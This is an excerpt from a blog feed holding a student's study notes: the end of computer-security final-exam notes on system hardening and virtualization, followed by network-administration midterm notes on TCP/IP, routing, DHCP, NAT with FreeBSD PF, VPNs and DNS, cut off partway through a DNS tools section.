href="#Security-Maintenance" class="headerlink" title="Security Maintenance"></a>Security Maintenance</h3><ul><li>Logging: Collect, monitor, and analyze system logs.</li><li>Backups: Regularly back up data and maintain archives.</li><li>Patching: Apply software updates systematically.</li><li>Other Maintenance: Recover from incidents, test security posture, and adjust configurations.</li></ul><h3 id="Linux-Unix-Security"><a href="#Linux-Unix-Security" class="headerlink" title="Linux&#x2F;Unix Security"></a>Linux&#x2F;Unix Security</h3><ul><li>Use yum, apt-get for patching.</li><li>Disable unnecessary services.</li><li>Use chmod, getfacl, setfacl for permissions.</li><li>Harden setuid root programs and remote access (iptables, TCP wrappers).</li><li>Log management: syslog, logrotate.</li><li>Isolate services using chroot jail.</li><li>Security tools: Nessus, Tripwire, Nmap.</li></ul><h3 id="Windows-Security"><a href="#Windows-Security" class="headerlink" title="Windows Security"></a>Windows Security</h3><ul><li>Patch via Windows Update or WSUS.</li><li>User management via Security IDs (SIDs) in SAM&#x2F;Active Directory.</li><li>Use User Account Control (UAC) and NTFS permissions.</li><li>Store config in Registry (edit with Registry Editor).</li><li>Enable anti-virus, firewall, BitLocker, EFS.</li><li>Test security using Microsoft Baseline Security Analyzer.</li></ul><h3 id="Virtualization-Security"><a href="#Virtualization-Security" class="headerlink" title="Virtualization Security"></a>Virtualization Security</h3><h4 id="Virtualization-Overview"><a href="#Virtualization-Overview" class="headerlink" title="Virtualization Overview"></a>Virtualization Overview</h4><ul><li>Allows multiple OS instances (VMs) on one physical system.</li><li>Hypervisor mediates between hardware and VMs.</li></ul><h4 id="Hypervisor-Types"><a href="#Hypervisor-Types" class="headerlink" title="Hypervisor Types"></a>Hypervisor Types</h4><table><thead><tr><th align="left">Type</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left"><strong>Type 1 (Native)</strong></td><td align="left">Direct control of hardware; higher security&#x2F;performance; servers.</td></tr><tr><td align="left"><strong>Type 2 (Hosted)</strong></td><td align="left">Runs on host OS; more risk of guest-host interference.</td></tr><tr><td align="left"><strong>Container-based</strong></td><td align="left">Isolated app environments sharing OS kernel (e.g. Docker).</td></tr></tbody></table><h4 id="Key-Security-Issues-NIST-SP-800-125"><a href="#Key-Security-Issues-NIST-SP-800-125" class="headerlink" title="Key Security Issues (NIST SP 800-125)"></a>Key Security Issues (NIST SP 800-125)</h4><ul><li><p>Isolate guest OSs from each other.</p></li><li><p>Secure hypervisor from compromise.</p></li><li><p>Control VM images, snapshots, and traffic segmentation.</p></li></ul><h4 id="Securing-Virtualized-Systems"><a href="#Securing-Virtualized-Systems" class="headerlink" title="Securing Virtualized Systems"></a>Securing Virtualized Systems</h4><ul><li><p>Harden hypervisor like a regular OS.</p></li><li><p>Limit hypervisor and guest OS admin access.</p></li><li><p>Control VM network and storage access.</p></li><li><p>Use segmentation for management and application traffic.</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;電腦安全總整與實作期末筆記&quot;&gt;&lt;a href=&quot;#電腦安全總整與實作期末筆記&quot; class=&quot;headerlink&quot; title=&quot;電腦安全總整與實作期末筆記&quot;&gt;&lt;/a&gt;電腦安全總整與實作期末筆記&lt;/h1&gt;&lt;h2 id=&quot;Chapter-5-Database-Cl</summary>
      
    
    
    
    <category term="資工" scheme="http://withoutdirection.github.io/categories/%E8%B3%87%E5%B7%A5/"/>
    
    
    <category term="電腦安全" scheme="http://withoutdirection.github.io/tags/%E9%9B%BB%E8%85%A6%E5%AE%89%E5%85%A8/"/>
    
    <category term="資工" scheme="http://withoutdirection.github.io/tags/%E8%B3%87%E5%B7%A5/"/>
    
  </entry>
  
  <entry>
    <title>NA 期中大抄</title>
    <link href="http://withoutdirection.github.io/NA-midterm/"/>
    <id>http://withoutdirection.github.io/NA-midterm/</id>
    <published>2025-04-18T16:00:00.000Z</published>
    <updated>2025-04-19T13:59:55.863Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TCP-IP-Protocol-Model-Four-Layer-Architecture"><a href="#TCP-IP-Protocol-Model-Four-Layer-Architecture" class="headerlink" title="TCP&#x2F;IP Protocol Model (Four-Layer Architecture)"></a>TCP&#x2F;IP Protocol Model (Four-Layer Architecture)</h1><h2 id="Layers-Overview"><a href="#Layers-Overview" class="headerlink" title="Layers Overview"></a>Layers Overview</h2><ul><li><strong>Link Layer:</strong> Handles hardware transmission details, like how data packets are sent over physical media (e.g., Ethernet).</li><li><strong>Network Layer:</strong> Uses IP to manage how packets travel from one host to another (routing).</li><li><strong>Transport Layer:</strong> Includes protocols like TCP or UDP, managing reliable or unreliable data transfer between two hosts.</li><li><strong>Application Layer:</strong> Deals with specific applications, such as HTTP, DNS, and FTP.</li></ul><h3 id="OSI-Model-Comparison"><a href="#OSI-Model-Comparison" class="headerlink" title="OSI Model Comparison"></a>OSI Model Comparison</h3><ul><li>TCP&#x2F;IP merges the Data Link and Physical layers into the “Link Layer.”</li><li>The Application Layer of TCP&#x2F;IP covers OSI’s Application, Presentation, and Session layers.</li></ul><hr><h2 id="Network-Addressing"><a href="#Network-Addressing" class="headerlink" title="Network Addressing"></a>Network Addressing</h2><h3 id="MAC-Address-Hardware-Layer"><a href="#MAC-Address-Hardware-Layer" class="headerlink" title="MAC Address (Hardware Layer)"></a>MAC Address (Hardware Layer)</h3><ul><li>48-bit unique identifier (e.g., <code>00:1A:2B:3C:4D:5E</code>).</li><li>Fixed on network cards, globally unique.</li></ul><h3 id="IP-Address-Logical-Address"><a href="#IP-Address-Logical-Address" class="headerlink" title="IP Address (Logical Address)"></a>IP Address (Logical Address)</h3><ul><li>IPv4: 32-bit (e.g., <code>192.168.1.1</code>).</li><li>Divided into network and host parts, separated using a subnet mask.</li></ul><h3 id="Port-Numbers"><a href="#Port-Numbers" class="headerlink" title="Port Numbers"></a>Port Numbers</h3><ul><li>16-bit (e.g., TCP port 80 for HTTP).</li><li>Allows programs on a host to distinguish each other.</li></ul><hr><h2 id="Link-Layer-and-Ethernet"><a href="#Link-Layer-and-Ethernet" class="headerlink" title="Link Layer and Ethernet"></a>Link Layer and Ethernet</h2><ul><li>Uses CSMA&#x2F;CD (Carrier Sense Multiple Access with Collision Detection).</li><li><strong>Frame Format:</strong> Source MAC, Destination MAC, Type, Data, CRC.</li><li><strong>MTU:</strong> 1500 bytes (maximum payload per Ethernet frame).</li><li>If the payload exceeds the MTU, IP layer performs <strong>fragmentation</strong>.</li></ul><hr><h2 id="Network-Layer-IP-Concepts"><a href="#Network-Layer-IP-Concepts" class="headerlink" title="Network Layer &amp; IP Concepts"></a>Network Layer &amp; IP Concepts</h2><ul><li><strong>IP:</strong> Unreliable, connectionless packet transmission.</li><li><strong>IP Header Includes:</strong> TTL, Protocol (TCP&#x3D;6, UDP&#x3D;17), Fragmentation Fields.</li><li><strong>CIDR:</strong> Classless addressing replacing Class A&#x2F;B&#x2F;C, supports better subnetting.</li></ul><hr><h2 id="Address-Resolution-Protocols"><a href="#Address-Resolution-Protocols" class="headerlink" title="Address Resolution Protocols"></a>Address Resolution Protocols</h2><h3 id="ARP-Address-Resolution-Protocol"><a href="#ARP-Address-Resolution-Protocol" class="headerlink" title="ARP (Address Resolution Protocol)"></a>ARP (Address Resolution Protocol)</h3><ul><li>Resolves IP to MAC address in LAN.</li><li>Uses broadcast ARP requests and targeted replies.</li><li>Maintains a temporary ARP cache.</li></ul><h3 id="RARP-Reverse-ARP"><a href="#RARP-Reverse-ARP" class="headerlink" title="RARP (Reverse ARP)"></a>RARP (Reverse ARP)</h3><ul><li>Obsolete, used by diskless devices to obtain IP from MAC.</li></ul><hr><h2 id="ICMP-Internet-Control-Message-Protocol"><a href="#ICMP-Internet-Control-Message-Protocol" class="headerlink" title="ICMP (Internet Control Message Protocol)"></a>ICMP (Internet Control Message Protocol)</h2><ul><li>Used for error reporting and diagnostics.</li><li><strong>Examples:</strong><ul><li>Ping (Echo Request&#x2F;Reply)</li><li>Traceroute (uses TTL &amp; Time Exceeded messages)</li><li>Destination Unreachable, Redirect, Time Exceeded</li></ul></li></ul><hr><h2 id="Transport-Layer-Protocols"><a href="#Transport-Layer-Protocols" class="headerlink" title="Transport Layer Protocols"></a>Transport Layer Protocols</h2><h3 id="UDP-User-Datagram-Protocol"><a href="#UDP-User-Datagram-Protocol" class="headerlink" title="UDP (User Datagram Protocol)"></a>UDP (User Datagram Protocol)</h3><ul><li>Connectionless and unreliable.</li><li>Low overhead, used in VoIP, DNS, streaming.</li></ul><h3 id="TCP-Transmission-Control-Protocol"><a href="#TCP-Transmission-Control-Protocol" class="headerlink" title="TCP (Transmission Control Protocol)"></a>TCP (Transmission Control Protocol)</h3><ul><li>Reliable, ordered, flow-controlled data transmission.</li><li><strong>Three-Way Handshake:</strong> SYN → SYN+ACK → ACK</li><li>Provides retransmission, flow control, and sequencing.</li></ul><hr><h2 id="Encapsulation-Decapsulation"><a href="#Encapsulation-Decapsulation" class="headerlink" title="Encapsulation &amp; Decapsulation"></a>Encapsulation &amp; Decapsulation</h2><ul><li><strong>Encapsulation (Sender):</strong> Application Data + Transport Header + IP Header + MAC Header</li><li><strong>Decapsulation (Receiver):</strong> Remove headers layer by layer to extract original data.</li></ul><hr><h2 id="IP-Header-Details"><a href="#IP-Header-Details" class="headerlink" title="IP Header Details"></a>IP Header Details</h2><ul><li><strong>TOS (Type of Service):</strong> Includes DSCP &amp; ECN for QoS and congestion handling.</li><li><strong>Fragment Offset &amp; Flags:</strong> Used in fragmentation.</li><li><strong>Protocol Field:</strong> Identifies upper-layer protocol (TCP&#x3D;6, UDP&#x3D;17).</li></ul><hr><h1 id="Routing-Fundamentals"><a href="#Routing-Fundamentals" class="headerlink" title="Routing Fundamentals"></a>Routing Fundamentals</h1><h3 id="Static-vs-Dynamic-Routing"><a href="#Static-vs-Dynamic-Routing" class="headerlink" title="Static vs Dynamic Routing"></a>Static vs Dynamic Routing</h3><ul><li><strong>Static Routing:</strong> Manually set, best for simple networks.</li><li><strong>Dynamic Routing:</strong> Adapts automatically to network changes using routing protocols.</li></ul><h3 id="Routing-Table-Protocols"><a href="#Routing-Table-Protocols" class="headerlink" title="Routing Table &amp; Protocols"></a>Routing Table &amp; Protocols</h3><ul><li>Maintains best routes to destinations.</li><li>Protocols exchange info about reachability, link status, metrics.</li></ul><h3 id="Common-Metrics"><a href="#Common-Metrics" class="headerlink" title="Common Metrics"></a>Common Metrics</h3><ul><li>Hop Count</li><li>Bandwidth</li><li>Delay</li><li>Load</li><li>Reliability</li></ul><hr><h2 id="Routing-Protocols-and-Autonomous-Systems"><a href="#Routing-Protocols-and-Autonomous-Systems" class="headerlink" title="Routing Protocols and Autonomous Systems"></a>Routing Protocols and Autonomous Systems</h2><h3 id="Autonomous-Systems-AS"><a href="#Autonomous-Systems-AS" class="headerlink" title="Autonomous Systems (AS)"></a>Autonomous Systems (AS)</h3><ul><li>Group of networks under common control.</li><li>Identified by an ASN.</li></ul><h3 id="Protocol-Scope"><a href="#Protocol-Scope" class="headerlink" title="Protocol Scope"></a>Protocol Scope</h3><ul><li><strong>IGP (Interior):</strong> RIP, IGRP, OSPF, EIGRP</li><li><strong>EGP (Exterior):</strong> BGP</li></ul><h3 id="Protocol-Types"><a href="#Protocol-Types" class="headerlink" title="Protocol Types"></a>Protocol Types</h3><ol><li><p><strong>Distance Vector:</strong></p><ul><li>Sends full routing table to neighbors.</li><li>E.g., RIP, IGRP, BGP (Path Vector style).</li></ul></li><li><p><strong>Link State:</strong></p><ul><li>Broadcasts link state info to build full topology.</li><li>E.g., OSPF, IS-IS</li></ul></li></ol><hr><h2 id="Routing-Protocol-Comparison-Table"><a href="#Routing-Protocol-Comparison-Table" class="headerlink" title="Routing Protocol Comparison Table"></a>Routing Protocol Comparison Table</h2><table><thead><tr><th>Protocol</th><th>Type</th><th>Scope</th><th>Transport</th><th>Port</th><th>CIDR</th><th>Convergence</th><th>Notes</th></tr></thead><tbody><tr><td>RIP</td><td>Distance Vector</td><td>IGP</td><td>UDP</td><td>520</td><td>v2 Yes</td><td>Slow</td><td>Simple, 15 hop limit</td></tr><tr><td>IGRP</td><td>Distance Vector</td><td>IGP</td><td>UDP (Cisco)</td><td>N&#x2F;A</td><td>No</td><td>Slow</td><td>Complex metric</td></tr><tr><td>OSPF</td><td>Link State</td><td>IGP</td><td>IP (89)</td><td>N&#x2F;A</td><td>Yes</td><td>Fast</td><td>Supports areas &amp; CIDR</td></tr><tr><td>BGP-4</td><td>Path Vector</td><td>EGP</td><td>TCP</td><td>179</td><td>Yes</td><td>Slow</td><td>Best path selection</td></tr></tbody></table><hr><h2 id="routed-Daemon-Unix-Routing-Daemon"><a href="#routed-Daemon-Unix-Routing-Daemon" class="headerlink" title="routed Daemon (Unix Routing Daemon)"></a>routed Daemon (Unix Routing Daemon)</h2><ul><li>Supports RIP v1&#x2F;v2.</li><li>Can:<ul><li>Auto-discover neighbors.</li><li>Read static routes from <code>/etc/gateways</code>.</li></ul></li><li>Modes:<ul><li>Server Mode: Actively broadcasts.</li><li>Quiet Mode: Passive listener.</li></ul></li></ul><hr><h1 id="Dynamic-Host-Configuration-Protocol-DHCP-NAT-Network-Address-Translation"><a href="#Dynamic-Host-Configuration-Protocol-DHCP-NAT-Network-Address-Translation" class="headerlink" title="Dynamic Host Configuration Protocol (DHCP) &amp; NAT (Network Address Translation)"></a>Dynamic Host Configuration Protocol (DHCP) &amp; NAT (Network Address Translation)</h1><h3 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h3><ul><li>Client-Server model.</li><li>Uses UDP (Server: 67, Client: 68).</li><li>DHCP Relay forwards requests across subnets.</li></ul><h3 id="Allocation-Types"><a href="#Allocation-Types" class="headerlink" title="Allocation Types"></a>Allocation Types</h3><table><thead><tr><th>Type</th><th>Description</th></tr></thead><tbody><tr><td>Dynamic</td><td>Temporary, lease-based IPs (common for mobile devices)</td></tr><tr><td>Automatic</td><td>Like dynamic, but tends to assign same IP repeatedly</td></tr><tr><td>Manual</td><td>Fixed IP bound to MAC (used for printers, servers)</td></tr></tbody></table><h3 id="DORA-Process"><a href="#DORA-Process" class="headerlink" title="DORA Process"></a>DORA Process</h3><ol><li><strong>Discover</strong> → 2. <strong>Offer</strong> → 3. <strong>Request</strong> → 4. <strong>Acknowledge</strong></li></ol><h3 id="Lease-Lifecycle"><a href="#Lease-Lifecycle" class="headerlink" title="Lease Lifecycle"></a>Lease Lifecycle</h3><ul><li>Renewal: Halfway point of lease time.</li><li>Rebinding: After renewal fails.</li><li>Release: Client sends explicit termination.</li></ul><h3 id="FreeBSD-DHCP-ISC-DHCP"><a href="#FreeBSD-DHCP-ISC-DHCP" class="headerlink" title="FreeBSD DHCP (ISC DHCP)"></a>FreeBSD DHCP (ISC DHCP)</h3><ul><li>Config: <code>/usr/local/etc/dhcpd.conf</code></li><li>Lease DB: <code>/var/db/dhcpd.leases</code></li><li>Startup: <code>/etc/rc.conf</code> with <code>dhcpd_enable=&quot;YES&quot;</code></li></ul><hr><h2 id="Network-Address-Translation-NAT"><a href="#Network-Address-Translation-NAT" class="headerlink" title="Network Address Translation (NAT)"></a>Network Address Translation (NAT)</h2><h3 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h3><ul><li>Hides internal IPs, conserves public IPs.</li><li>Modifies IP headers to route between networks.</li></ul><h3 id="NAPT-Port-Translation"><a href="#NAPT-Port-Translation" class="headerlink" title="NAPT (Port Translation)"></a>NAPT (Port Translation)</h3><ul><li>Maps multiple internal IP:port to one external IP:port.</li></ul><h3 id="Private-IP-Ranges-RFC-1918"><a href="#Private-IP-Ranges-RFC-1918" class="headerlink" title="Private IP Ranges (RFC 1918)"></a>Private IP Ranges (RFC 1918)</h3><ul><li><code>10.0.0.0/8</code></li><li><code>172.16.0.0/12</code></li><li><code>192.168.0.0/16</code></li></ul><h3 id="NAT-Types"><a href="#NAT-Types" class="headerlink" title="NAT Types"></a>NAT Types</h3><table><thead><tr><th>Type</th><th>Behavior</th></tr></thead><tbody><tr><td>Full Cone</td><td>Any external host can send to internal IP once mapped</td></tr><tr><td>Restricted</td><td>Only external IPs that received packets can reply</td></tr><tr><td>Port-Restricted</td><td>Must match both IP and port</td></tr><tr><td>Symmetric</td><td>Unique mapping per destination</td></tr></tbody></table><h3 id="Limitations"><a href="#Limitations" class="headerlink" title="Limitations"></a>Limitations</h3><ul><li>Issues with embedded IPs (FTP, SIP).</li><li>Problems with ICMP and IPSec.</li></ul><h3 id="FreeBSD-NAT-via-PF"><a href="#FreeBSD-NAT-via-PF" class="headerlink" title="FreeBSD NAT via PF"></a>FreeBSD NAT via PF</h3><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nat <span class="keyword">on</span> <span class="variable">$ext_if</span> <span class="keyword">from</span> <span class="variable">$lan_net</span> <span class="keyword">to</span> <span class="literal">any</span> -&gt; <span class="variable">$public_ip</span></span><br><span class="line">rdr <span class="keyword">on</span> <span class="variable">$ext_if</span> <span class="keyword">proto</span> tcp <span class="keyword">from</span> <span class="literal">any</span> <span class="keyword">to</span> <span class="variable">$public_ip</span> <span class="keyword">port</span> <span class="number">80</span> -&gt; <span class="number">192.168</span>.<span class="number">1.10</span> <span class="keyword">port</span> <span class="number">80</span></span><br><span class="line">binat <span class="keyword">on</span> <span class="variable">$ext_if</span> <span class="keyword">from</span> <span class="variable">$lan_net</span> <span class="keyword">to</span> <span class="literal">any</span> -&gt; <span class="variable">$public_ip</span></span><br></pre></td></tr></table></figure><hr><h2 id="NAT-Network-Address-Translation-Explanation"><a href="#NAT-Network-Address-Translation-Explanation" class="headerlink" title="NAT (Network Address Translation) Explanation"></a>NAT (Network Address Translation) Explanation</h2><ol><li><p><strong>NAT Core Functionality:</strong></p><ul><li>NAT enables communication between different network segments by modifying the source&#x2F;destination IP addresses of IP packets.</li><li>Main functions:<ul><li>Translation between internal private IPs and external public IPs.</li><li>Enhanced security (packets cannot directly enter the internal network from outside).</li><li>Conservation of public IP addresses.</li></ul></li></ul></li><li><p><strong>NAPT (PAT, Port Address Translation):</strong></p><ul><li><p>NAPT uses source&#x2F;destination port numbers to distinguish multiple connections.</p></li><li><p>Example:</p><table><thead><tr><th align="left">Internal Host</th><th align="left">NAT Device</th></tr></thead><tbody><tr><td align="left">192.168.0.2:4321</td><td align="left">203.0.113.10:10001</td></tr><tr><td align="left">192.168.0.3:5678</td><td align="left">203.0.113.10:10002</td></tr></tbody></table></li><li><p>Allows hundreds of internal hosts to share a single public IP.</p></li></ul></li><li><p><strong>Private IPs and Security:</strong></p><ul><li>According to RFC1918, these ranges are private and not routed on the internet: [cite: 157, 158]<ul><li>10.0.0.0&#x2F;8</li><li>172.16.0.0&#x2F;12</li><li>192.168.0.0&#x2F;16</li></ul></li><li>Using these IPs behind NAT enhances basic security as external entities cannot initiate connections.</li></ul></li><li><p><strong>NAT Type Analysis (Cone vs. Symmetric):</strong></p><ul><li>Cone NATs and Symmetric NATs differ in their P2P connection success rates.</li></ul><table><thead><tr><th align="left">Type</th><th align="left">Behavior</th></tr></thead><tbody><tr><td align="left">Full Cone</td><td align="left">All responses to the same source are allowed to enter.</td></tr><tr><td align="left">Restricted Cone</td><td align="left">Restricts by source IP.</td></tr><tr><td align="left">Port-Restricted Cone</td><td align="left">Restricts by source IP and port.</td></tr><tr><td align="left">Symmetric NAT</td><td align="left">Each external connection creates a unique mapping.</td></tr></tbody></table></li><li><p><strong>NAT Limitations and Compatibility Issues:</strong></p><ul><li>Protocols embedding IP addresses in the application layer (e.g., FTP, SIP) may fail. [cite: 159, 160]</li><li>ICMP packets may be blocked or incorrectly modified.</li><li>IPSec VPNs are prone to connection failures due to IP encapsulation disruption.</li></ul></li><li><p><strong>Configuring NAT with PF on FreeBSD:</strong></p><ul><li>FreeBSD uses PF (Packet Filter) for NAT.</li><li>Key syntax:<ul><li><code>nat on $ext_if from $lan_net to any -&gt; $public_ip</code></li><li><code>rdr on $ext_if proto tcp from any to $public_ip port 80 -&gt; 192.168.1.10 port 80</code></li><li><code>binat on $ext_if from $lan_net to any -&gt; $public_ip</code></li></ul></li><li><code>nat</code>: NAT for internal network accessing external.</li><li><code>rdr</code>: Redirects external access to a port to an internal server (for web hosting).</li><li><code>binat</code>: Bidirectional NAT (less common).</li></ul></li></ol><h2 id="Summary-Table"><a href="#Summary-Table" class="headerlink" title="Summary Table"></a>Summary Table</h2><table><thead><tr><th align="left">Technology</th><th align="left">Key Function</th><th align="left">Notes</th></tr></thead><tbody><tr><td align="left">DHCP</td><td align="left">Automatic IP assignment</td><td align="left">Supports dynamic, manual, auto assign</td></tr><tr><td align="left">NAT</td><td align="left">IP address translation</td><td align="left">SNAT, DNAT, NAPT</td></tr><tr><td align="left">FreeBSD</td><td align="left">Configurable DHCP + NAT</td><td align="left">Uses isc dhcpd and pf tools</td></tr></tbody></table><h1 id="VPN-Basics-and-Architecture"><a href="#VPN-Basics-and-Architecture" class="headerlink" title="VPN Basics and Architecture"></a>VPN Basics and Architecture</h1><h2 id="What-is-VPN"><a href="#What-is-VPN" class="headerlink" title="What is VPN?"></a>What is VPN?</h2><ul><li>A <strong>Virtual Private Network (VPN)</strong> simulates a private communication channel over a public network like the Internet.</li><li>It enables <strong>secure, encrypted communication</strong> between users, branches, or internal systems.</li><li>VPNs act like private links between hosts, despite being transmitted through shared infrastructure.</li></ul><h2 id="Common-Use-Cases"><a href="#Common-Use-Cases" class="headerlink" title="Common Use Cases"></a>Common Use Cases</h2><ul><li><strong>Remote access</strong> for employees or teleworkers.</li><li><strong>Site-to-site VPNs</strong> connecting branch offices securely.</li><li><strong>Internal communication</strong> security in a LAN environment.</li></ul><h2 id="Why-Use-VPN"><a href="#Why-Use-VPN" class="headerlink" title="Why Use VPN?"></a>Why Use VPN?</h2><table><thead><tr><th>Feature</th><th>Benefit</th></tr></thead><tbody><tr><td>Cost-effective</td><td>Avoids dedicated leased lines by using public internet.</td></tr><tr><td>Scalable</td><td>Easily add users&#x2F;sites without infrastructure overhaul.</td></tr><tr><td>Manageable</td><td>Centralized control via software and certificates.</td></tr><tr><td>Secure</td><td>Encrypts traffic, ensuring confidentiality and integrity.</td></tr></tbody></table><h2 id="Core-Concept-Tunneling"><a href="#Core-Concept-Tunneling" class="headerlink" title="Core Concept: Tunneling"></a>Core Concept: Tunneling</h2><ul><li><strong>Encapsulation:</strong> The original packet is wrapped inside another packet.</li><li><strong>External nodes only see the outer shell</strong>; content remains encrypted.</li><li><strong>Allows protocol compatibility</strong> for services not natively supported.</li></ul><h2 id="VPN-Security-Requirements"><a href="#VPN-Security-Requirements" class="headerlink" title="VPN Security Requirements"></a>VPN Security Requirements</h2><ol><li><strong>User Authentication:</strong> Ensures only authorized users access the network.</li><li><strong>Key Management:</strong> Safely generates and distributes encryption keys.</li><li><strong>Address Management:</strong> Allocates private IPs to clients securely.</li><li><strong>Encryption:</strong> Protects data in transit from tampering or snooping.</li></ol><h2 id="VPN-Security-Features"><a href="#VPN-Security-Features" class="headerlink" title="VPN Security Features"></a>VPN Security Features</h2><table><thead><tr><th>Feature</th><th>Description</th></tr></thead><tbody><tr><td>Authentication</td><td>Validates identity of user&#x2F;device.</td></tr><tr><td>Data Integrity</td><td>Ensures data isn’t altered during transmission.</td></tr><tr><td>Confidentiality</td><td>Encrypts data to protect from eavesdropping.</td></tr><tr><td>Access Control</td><td>Limits access to authorized users&#x2F;devices.</td></tr></tbody></table><h2 id="VPN-Protocol-Types-and-Comparison"><a href="#VPN-Protocol-Types-and-Comparison" class="headerlink" title="VPN Protocol Types and Comparison"></a>VPN Protocol Types and Comparison</h2><h3 id="PPP-based-Protocols"><a href="#PPP-based-Protocols" class="headerlink" title="PPP-based Protocols"></a>PPP-based Protocols</h3><ul><li><strong>PPTP:</strong> Deprecated due to major vulnerabilities.</li><li><strong>L2TP&#x2F;IPsec:</strong> Combines tunneling with encryption (L2TP + IPsec).</li></ul><h3 id="TCP-IP-based"><a href="#TCP-IP-based" class="headerlink" title="TCP&#x2F;IP-based"></a>TCP&#x2F;IP-based</h3><ul><li><strong>IPsec</strong><ul><li><strong>Transport mode:</strong> Encrypts only data portion.</li><li><strong>Tunnel mode:</strong> Encrypts entire IP packet, ideal for VPN.</li></ul></li><li><strong>BGP&#x2F;MPLS IP VPN:</strong> Enterprise-level, ISP-grade technology.</li></ul><h3 id="SSL-TLS-based"><a href="#SSL-TLS-based" class="headerlink" title="SSL&#x2F;TLS-based"></a>SSL&#x2F;TLS-based</h3><ul><li><strong>SSL VPN</strong><ul><li>Works via browser using HTTPS.</li></ul></li><li><strong>SSTP</strong><ul><li>Microsoft’s SSL-based tunneling.</li></ul></li><li><strong>OpenVPN</strong><ul><li>Uses OpenSSL and TLS.</li><li>Supports TUN (L3) and TAP (L2).</li><li>Highly flexible, includes CA and certificate support.</li></ul></li><li><strong>WireGuard</strong><ul><li>Lightweight, modern, minimal attack surface.</li><li>Uses UDP and modern cryptography (Curve25519, ChaCha20).</li><li>Simple configuration with public&#x2F;private key pairs.</li></ul></li></ul><h2 id="OpenVPN-vs-WireGuard"><a href="#OpenVPN-vs-WireGuard" class="headerlink" title="OpenVPN vs WireGuard"></a>OpenVPN vs WireGuard</h2><table><thead><tr><th>Feature</th><th>OpenVPN</th><th>WireGuard</th></tr></thead><tbody><tr><td>Design</td><td>Mature, secure, flexible</td><td>Modern, efficient, simple</td></tr><tr><td>Encryption</td><td>TLS + OpenSSL</td><td>Curve25519, ChaCha20, etc.</td></tr><tr><td>Performance</td><td>Good, but TAP can slow it down</td><td>High performance, low latency</td></tr><tr><td>Config Complexity</td><td>Higher, more granular options</td><td>Minimal, easy to manage</td></tr><tr><td>Cross-platform</td><td>Widely supported</td><td>Also widely supported</td></tr><tr><td>Auth Method</td><td>Certificate, username&#x2F;password</td><td>Public key based</td></tr><tr><td>Tunnel Mode</td><td>TUN + TAP</td><td>TUN (bridge requires extra)</td></tr></tbody></table><h2 id="Use-Case-Recommendations"><a href="#Use-Case-Recommendations" class="headerlink" title="Use Case Recommendations"></a>Use Case Recommendations</h2><ul><li><strong>OpenVPN:</strong> Ideal for enterprise use with multi-user, multi-auth layers.</li><li><strong>WireGuard:</strong> Best for individuals, small teams, or remote access scenarios.</li></ul><hr><h1 id="DNS-Domain-Name-System-Overview"><a href="#DNS-Domain-Name-System-Overview" class="headerlink" title="DNS (Domain Name System) Overview"></a>DNS (Domain Name System) Overview</h1><h2 id="Importance-of-DNS"><a href="#Importance-of-DNS" class="headerlink" title="Importance of DNS"></a>Importance of DNS</h2><ul><li>Converts easy-to-remember <strong>domain names</strong> (e.g., <a href="http://www.google.com/">www.google.com</a>) into IP addresses.</li><li>Essential for IPv6 due to complex address formats.</li></ul><h2 id="DNS-Namespace"><a href="#DNS-Namespace" class="headerlink" title="DNS Namespace"></a>DNS Namespace</h2><ul><li>Hierarchical tree with <strong>root zone (.)</strong> at the top.</li><li>Below are <strong>TLDs</strong> like <code>.com</code>, <code>.edu</code>, then subdomains like <code>nycu.edu.tw</code>.</li><li>Restrictions:<ul><li>Max full domain: 255 bytes.</li><li>Max label: 63 bytes.</li></ul></li></ul><h2 id="How-DNS-Works"><a href="#How-DNS-Works" class="headerlink" title="How DNS Works"></a>How DNS Works</h2><h3 id="Query-Types"><a href="#Query-Types" class="headerlink" title="Query Types"></a>Query Types</h3><ul><li><strong>Recursive:</strong> Resolver queries all servers on behalf of client.</li><li><strong>Iterative:</strong> Resolver refers the client to other DNS servers.</li></ul><h3 id="Caching"><a href="#Caching" class="headerlink" title="Caching"></a>Caching</h3><ul><li>Speeds up response and reduces traffic.</li><li><strong>Positive cache:</strong> TTL-based successful records.</li><li><strong>Negative cache:</strong> Stores failed queries temporarily.</li></ul><h2 id="Zones-and-Name-Server-Types"><a href="#Zones-and-Name-Server-Types" class="headerlink" title="Zones and Name Server Types"></a>Zones and Name Server Types</h2><ul><li><strong>Zone:</strong> Portion of DNS namespace managed by one authority.</li><li><strong>Authoritative server:</strong> Holds original data (master&#x2F;slave).</li><li><strong>Non-authoritative:</strong> Serves from cache.</li><li><strong>Recursive server:</strong> Completes queries.</li><li><strong>Forwarder:</strong> Forwards to other DNS servers.</li><li><strong>Caching server:</strong> Optimized for caching responses.</li></ul><h2 id="DNS-Security"><a href="#DNS-Security" class="headerlink" title="DNS Security"></a>DNS Security</h2><h3 id="DNSSEC"><a href="#DNSSEC" class="headerlink" title="DNSSEC"></a>DNSSEC</h3><ul><li>Uses asymmetric crypto to ensure:<ul><li>Data origin authentication.</li><li>Integrity validation.</li><li>Authenticated denial of existence.</li></ul></li></ul><h3 id="DoT-and-DoH"><a href="#DoT-and-DoH" class="headerlink" title="DoT and DoH"></a>DoT and DoH</h3><ul><li><strong>DoT (DNS over TLS):</strong> Uses TCP + TLS, port 853.</li><li><strong>DoH (DNS over HTTPS):</strong> Uses HTTPS, port 443.</li><li>Prevents eavesdropping and DNS spoofing.</li></ul><h3 id="DNS-Amplification-Attack"><a href="#DNS-Amplification-Attack" class="headerlink" title="DNS Amplification Attack"></a>DNS Amplification Attack</h3><ul><li>Uses spoofed queries to reflect large responses to a target (DDoS).</li></ul><h2 id="DNS-Tools-and-Files"><a href="#DNS-Tools-and-Files" class="headerlink" title="DNS Tools and Files"></a>DNS Tools and Files</h2><table><thead><tr><th>File</th><th>Purpose</th></tr></thead><tbody><tr><td><code>/etc/resolv.conf</code></td><td>DNS servers and search domains</td></tr><tr><td><code>/etc/hosts</code></td><td>Local manual DNS mappings</td></tr><tr><td><code>/etc/nsswitch.conf</code></td><td>Lookup order configuration</td></tr></tbody></table><h3 id="CLI-Tools"><a href="#CLI-Tools" class="headerlink" title="CLI Tools"></a>CLI 